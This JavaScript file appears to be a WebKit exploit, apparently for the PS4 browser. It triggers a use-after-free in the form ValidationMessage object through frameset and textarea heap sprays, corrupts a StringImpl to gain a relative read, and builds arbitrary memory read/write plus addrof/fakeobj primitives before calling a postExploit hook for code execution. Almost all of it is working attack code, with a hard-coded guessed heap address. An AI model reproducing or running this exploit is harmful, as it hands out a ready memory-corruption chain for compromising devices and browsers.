const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

//let addressArray = ["0x202714e58","0x202714f30","0x202715008","0x2027150e0","0x2017ed518","0x2027151b8","0x202715290","0x202715368","0x2017ed7a0","0x202715440","0x2017ed878","0x202715518","0x2017ed950","0x2027155f0","0x2017eda28","0x2027156c8","0x2017edb00","0x2027157a0","0x2017edbd8","0x202715878","0x2017edcb0","0x202715950","0x2017edd88","0x202715a28","0x2017ede60","0x202715b00","0x2017edf38","0x202715bd8","0x2017ee010","0x202715cb0","0x2017ee0e8","0x202715d88","0x2017ee1c0","0x202715e60","0x2017ee298","0x202715f38","0x2017ee370","0x202716010","0x2017ee448","0x2027160e8","0x2017ee520","0x2027161c0","0x201be8000","0x2017ee5f8","0x202716298","0x201be80d8","0x2017ee6d0","0x202716370","0x201be81b0","0x2017ee7a8","0x201be8288","0x201be8360","0x201be8438","0x201be8510","0x201be86c0","0x201be8870","0x201be8af8","0x2027167a8","0x202716958","0x201be8798","0x201be9bd8","0x201be9cb0","0x201be9d88","0x202716a30","0x201be9e60","0x201be9f38","0x201bea010","0x201bea0e8","0x201bea1c0","0x202716b08","0x201bea298","0x201be8948","0x2017eef40","0x202716be0","0x201be8a20","0x202716cb8","0x2017ef0f0","0x201be8bd0","0x2017ef1c8","0x202716e68","0x201be8ca8","0x2017ef2a0","0x201beb600","0x201beb6d8","0x201beb7b0","0x202716f40","0x201be8d80","0x201beb888","0x2017ef378","0x201beb960","0x201beba38","0x201bebb10","0x201bebbe8","0x202717018","0x201be8e58","0x201bebcc0","0x2017ef450","0x201bebd98","0x201bebe70","0x2027170f0","0x201be8f30","0x2017ef528","0x2027171c8","0x201be9008","0x2017ef600","0x2027172a0","0x201be90e0","0x2017ef6d8","0x202717378","0x201be91b8","0x2017ef7b0","0x2017ecf30","0x2017ed008","0x2017ed0e0","0x202717450","0x201be9290","0x2017ed1b8","0x2017ef888","0x2017ed290","0x2017ed368","0x2017ed440","0x202717528","0x201be9368","0x2017ed5f0","0x2017ef960","0x2017ed6c8","0x202717600","0x201be9440","0x2017efa38","0x2027176d8","0x201be9518","0x2017efb10","0x2027177b0","0x201be95f0","0x2017efbe8","0x202717888","0x201be96c8","0x2017efcc0","0x2017ee880","0x2017ee958","0x2017eea30","0x202717960","0x201be97a0","0x2017eeb08","0x2017eebe0","0x2017efd98","0x2017eecb8","0x2017eed90","0x2017ec000","0x2017eee68","0x202717a38","0x201be9878","0x2017ef018","0x2017efe70","0x202717b10","0x201be9950","0x202717be8","0x201be9a28","0x202717cc0","0x201be9b00","0x202717d98","0x201bea370","0x201bea448","0x201bea520","0x201bea5f8","0x201bea6d0","0x201bea7a8","0x201bea880","0x201bea958","0x201be85e8","0x201beaa30","0x202714af8","0x202714bd0","0x201beab08","0x202714ca8","0x202714d80","0x201beabe0","0x201beacb8","0x201bead90","0x201beae68","0x201beaf40","0x202716448","0x202716520","0x2027165f8","0x2027166d0","0x202716880","0x201beb0f0","0x201beb018","0x202716d90","0x201beb1c8","0x201beb2a0","0x201beb378","0x201beb450","0x202717e70","0x201beb528","0x2017ec0d8","0x2017ec1b0","0x2017ec288","0x2017ec360","0x202714000","0x2017ec438","0x2027140d8","0x2017ec510","0x2027141b0","0x2017ec5e8","0x202714288","0x2017ec6c0","0x202714360","0x2017ec798","0x2017ec870","0x202714510","0x2017ec948","0x2027145e8","0x2017eca20","0x2027146c0","0x2017ecaf8","0x202714798","0x2017ecbd0","0x202714870","0x2017ecca8","0x202714438","0x202714948","0x2017ecd80","0x202714a20","0x2017ece58","0x202514000","0x2025140d8","0x2025141b0","0x202514288","0x202514360","0x202514510","0x2025145e8","0x2025146c0","0x202514798","0x202514438","0x202514870","0x202514948","0x202514a20","0x202515368","0x202515440","0x202515518","0x2025155f0","0x2025156c8","0x2025157a0","0x202515878","0x202515950","0x202514af8","0x202514bd0","0x202514ca8","0x202514d80","0x202515a28","0x202514e58","0x202514f30","0x202515008","0x2025150e0","0x2025151b8","0x202515b00","0x202515290","0x202515bd8","0x202515cb0","0x202515d88","0x202515e60","0x202516448","0x202516520","0x2025165f8","0x2025166d0","0x202515f38","0x2025167a8","0x202516880","0x202516958","0x202516a30","0x202516010","0x2025160e8","0x2025161c0","0x202516298","0x202516370","0x202517e70","0x202516b08","0x202516be0","0x202516cb8","0x202516d90","0x202516e68","0x202516f40","0x202517018","0x2025170f0","0x2025171c8","0x2025172a0","0x202517378","0x202517450","0x202517528","0x202517600","0x2025176d8","0x2025177b0","0x202517888","0x202517960","0x202517a38","0x202517b10","0x202517be8","0x202517cc0","0x202517d98","0x202a29b00","0x202a29bd8","0x202a29cb0","0x202a29d88","0x202a29e60","0x202a29f38","0x202a2a010","0x202a2a0e8","0x202a2a1c0","0x202a2a298","0x202a2a370","0x202a2a448","0x202a2a520","0x202a2a5f8","0x202a2a6d0","0x202a2a7a8","0x202a2a880","0x202a2a958","0x202a2aa30","0x202a2ab08","0x202a2abe0","0x202a2acb8","0x202a2ad90","0x202a2ae68","0x202a28000","0x202a280d8","0x202a281b0","0x202a28510","0x202a2b018","0x202a2b0f0","0x202a2b1c8","0x202a295f0","0x202a296c8","0x202a297a0","0x202a29878","0x202a29950","0x202a29a28","0x202a2b450","0x202a2b528","0x202a2b6d8","0x202a2af40","0x202a2b2a0","0x202a2b378","0x202a2b960","0x202a2b600","0x202a2b7b0","0x202a2b888","0x202a2ba38","0x202a2bb10","0x202a2bd98","0x202a2bbe8","0x202a2bcc0","0x202a2be70","0x202a28288","0x202a28360","0x202a28438","0x202a285e8","0x202a286c0","0x202a28798","0x202a28870","0x202a28948","0x202a28a20","0x202a28af8","0x202a28bd0","0x202a28ca8","0x202a28d80","0x202a28e58","0x202a28f30","0x202a29008","0x202a290e0","0x202a291b8","0x202a29290","0x202a29368","0x202a29440","0x202a29518","0x20204cbd0","0x20204cca8","0x20204cd80","0x20204ce58","0x20204cf30","0x20204d008","0x20204d0e0","0x20204d1b8","0x20204d290","0x20204d368","0x20204d440","0x20204d518","0x20204d5f0","0x20204d6c8","0x20204d7a0","0x20204d878","0x20204d950","0x20204da28","0x20204db00","0x20204dbd8","0x20204dcb0","0x20204dd88","0x20204de60","0x20204e520","0x20204e5f8","0x20204e7a8","0x20204e880","0x20204ea30","0x20204eb08","0x20204ebe0","0x20204c5e8","0x20204c6c0","0x20204ecb8","0x20204c798","0x20204c870","0x20204c948","0x20204ca20","0x20204caf8","0x20204ed90","0x20204ee68","0x20204ef40","0x20204f018","0x20204f0f0","0x20204df38","0x20204e010","0x20204f1c8","0x20204e0e8","0x20204e1c0","0x20204e298","0x20204e370","0x20204e448","0x20204f2a0","0x20204e6d0","0x20204f378","0x20204e958","0x20204f450","0x20204f528","0x20204f600","0x20204f888","0x20204f960","0x20204f6d8","0x20204fa38","0x20204fb10","0x20204fd98","0x20204f7b0","0x20204fcc0","0x20204fe70","0x20204fbe8","0x20204c000","0x20204c0d8","0x20204c1b0","0x20204c288","0x20204c360","0x20204c438","0x20204c510"]
//let randAddress = addressArray[Math.floor(Math.random() * 450)]
//var guess_htmltextarea_addr = new Int64(randAddress);

var guess_htmltextarea_addr = new Int64("0x2031b00d8");


/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("[+] Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");

	debug_log("[+] Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");

	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("[+] Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");

	debug_log("[+] Succesfully got arbitrary R/W!");

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	debug_log("[+] Succesfully got addrof/fakeobj");

	/* Getting code execution */
	/* ... */
	if(window.postExploit)
		window.postExploit();
}

function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("[+] Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("[+] StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");

	debug_log("[+] Got a relative read");

        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	debug_log("[+] Before deleted validation message")
	document.body.appendChild(g_input);
	debug_log("[+] After deleted validation message")
	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

		debug_log("[+] Reuse obj - free validation obj neighbors")

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	debug_log("[+] Get back target Object")

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("[+] m_timer: " + g_timer_leak);
	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
	debug_log("[+] m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("[+] Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	debug_log("[+] Created element frames.")

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);

		debug_log("[+] NB Frames Spray 1 complete");

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	debug_log("[+] NB Frames Spray 2 complete");

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	
	g_input.autofocus = true;

}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("[+] Spraying HTMLTextareaElement  - Guess address:  default");

	let textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
	/* Init spray */
	sprayHTMLTextArea();

	debug_log("[+] Spraying complete.")

	if(window.midExploit)
		window.midExploit();

	g_input = input1;
	/* Shape heap layout for obj. reuse */
	prepareUAF();
}
